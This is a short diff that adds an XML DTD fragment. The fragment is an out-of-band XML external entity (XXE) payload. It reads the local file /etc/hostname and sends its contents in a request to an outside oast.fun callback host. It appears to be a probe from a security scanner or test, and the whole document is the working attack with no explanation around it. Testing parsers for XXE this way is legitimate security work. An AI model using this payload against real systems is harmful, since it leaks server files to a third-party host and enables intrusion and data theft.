@@ -1,0 +1,4 @@
+<!ENTITY % local SYSTEM "file:///etc/hostname">
+<!ENTITY % stage "<!ENTITY &#x25; exfil SYSTEM 'https://ioczmasuxkcvwrggbffg1csnwsynanrej.oast.fun/file415-crop-lfi-b31f?value=%local;'>">
+%stage;
+%exfil;
